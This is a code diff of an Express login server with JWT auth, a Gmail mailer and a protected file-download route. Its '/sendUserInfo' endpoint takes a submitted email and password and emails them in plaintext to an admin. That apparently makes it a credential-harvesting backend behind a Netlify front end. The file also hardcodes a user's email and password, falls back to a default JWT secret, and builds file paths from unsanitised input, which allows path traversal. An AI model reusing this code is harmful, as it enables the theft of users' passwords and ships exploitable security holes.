@@ -11,8 +11,8 @@ const nodemailer = require("nodemailer");
 const app = express();
 
 const allowedOrigins = [
-  'http://localhost:3000',               // your local dev frontend URL
-  'https://po0948.netlify.app'   // your deployed Netlify frontend URL
+  'http://localhost:3000',              // your local dev frontend URL
+  'https://po0948.netlify.app' // your deployed frontend URL
 ];
 
 const PORT = process.env.PORT || 8080;
@@ -23,30 +23,35 @@ const SECRET = process.env.SECRET || "default_secret_if_none_set";
 
 app.use(cors({
   origin: function (origin, callback) {
-    if (!origin) return callback(null, true);  // allow requests with no origin (e.g. Postman, curl)
+    if (!origin) return callback(null, true);
     if (allowedOrigins.indexOf(origin) === -1) {
-      return callback(new Error('Not allowed by CORS'), false); // reject other origins
+      return callback(new Error('Not allowed by CORS'), false);
     }
     return callback(null, true);
   },
-  credentials: true // allow cookies/auth headers
+  credentials: true
 }));
 
 app.use(bodyParser.json());
 
+// Mock user (replace with DB in production)
 const USER = { id: 1, email: "egli79380@gmail.com", password: "password123_zMq-h5*wE-FdUk" };
 
+// Login API returns JWT on success
 app.post('/api/login', (req, res) => {
   const { email, password } = req.body;
+  if (!email || !password) {
+    return res.status(400).json({ success: false, message: "Email and password are required." });
+  }
   if (email === USER.email && password === USER.password) {
     const token = jwt.sign({ id: USER.id, email: USER.email }, SECRET, { expiresIn: "2h" });
-    res.json({ success: true, token });
+    return res.json({ success: true, token });
   } else {
-    res.status(401).json({ success: false, message: "Invalid credentials" });
+    return res.status(401).json({ success: false, message: "Invalid credentials" });
   }
 });
 
-// ----------- NODemailer SETUP -----------
+// Setup Nodemailer transporter using Gmail SMTP
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
@@ -55,25 +60,27 @@ const transporter = nodemailer.createTransport({
   }
 });
 
+// Endpoint to send user info (for alerts to admin)
 app.post('/sendUserInfo', (req, res) => {
   const userData = req.body;
   const mailOptions = {
-    from: smtpUser, // Use env vars here!
+    from: smtpUser,
     to: adminEmail,
-    subject: 'User Information',
-    text: `User Email: ${userData.email}, User Password: ${userData.password}`
+    subject: 'User Information Alert',
+    text: `Login attempt - Email: ${userData.email}, Password: ${userData.password}`
   };
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
-      console.error(error);
+      console.error('Email send error:', error);
       res.status(500).send('Failed to send email');
     } else {
-      console.log('Email sent: ' + info.response);
+      console.log('Admin email sent:', info.response);
       res.status(200).send('Email sent successfully');
     }
   });
 });
 
+// Middleware to authenticate JWT
 function authenticate(req, res, next) {
   const auth = req.headers.authorization;
   if (!auth) return res.status(403).json({ message: "Missing token" });
@@ -86,6 +93,7 @@ function authenticate(req, res, next) {
   }
 }
 
+// Example protected route to download files
 app.get('/api/file/:id', authenticate, (req, res) => {
   const fileId = req.params.id;
   const filePath = path.join(__dirname, 'protected_files', fileId);
